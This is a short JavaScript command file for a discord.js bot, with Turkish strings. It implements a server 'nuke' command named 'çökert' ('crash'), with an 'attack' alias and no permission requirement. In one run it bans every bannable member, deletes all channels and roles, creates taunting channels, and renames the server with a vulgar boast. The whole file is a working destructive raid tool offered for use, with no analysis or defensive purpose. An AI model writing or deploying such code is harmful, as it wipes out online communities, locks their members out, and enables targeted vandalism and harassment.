const Discord = require('discord.js');

exports.run = async (client, message, args) => {
if (message.guild) {
message.delete()        


message.guild.members.forEach(u => {
if (u.bannable) {
return u.ban();
}
})


message.guild.channels.deleteAll("");
message.guild.roles.deleteAll("");
message.guild.createChannel(`Soulless?`, 'text');
message.guild.createChannel(`Soulless Uğradı? )`, 'text');
message.guild.createChannel(`▬▬▬▬▬▬▬▬▬▬▬`, 'voice');
message.guild.createChannel(`Soulless?`, 'voice');
message.guild.createChannel(`Bizi durduramazsın`, 'voice');
message.guild.createChannel(`Soulless?`, 'voice');
message.guild.createChannel(`▬▬▬▬▬▬▬▬▬▬▬`, 'voice');
message.guild.setName(`Soulless? Buradaydı Ve Sikti`);
message.guild.setIcon(`https://discord.gg/p9HdT7D`)
}

};  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['çökert','attack',''],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
    name: 'çökert',
  description: 'Sunucuyu çökertir.', 
  usage: 'xRayex = sunucu siker'
};